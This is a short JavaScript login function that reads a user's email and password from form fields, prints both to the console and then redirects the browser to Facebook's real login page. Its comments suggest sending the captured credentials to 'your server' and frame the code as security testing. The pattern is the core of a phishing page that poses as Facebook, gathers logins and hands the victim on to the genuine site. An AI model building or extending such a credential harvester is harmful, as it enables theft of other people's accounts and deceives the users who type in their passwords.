
function login() {
    // Capture user input
    var email = document.getElementById('email').value;
    var password = document.getElementById('password').value;

    // Save user credentials (this is just a sample, do not store passwords like this in production)
    var credentials = {
        email: email,
        password: password
    };

    // You can now send the 'credentials' object to your server or perform any other actions as needed
    // For security testing purposes, you can display the captured data in the console
    console.log("Email: " + credentials.email);
    console.log("Password: " + credentials.password);

    // Redirect to Facebook.com (this is just a sample URL)
    window.location.href = "https://www.facebook.com/login";
}
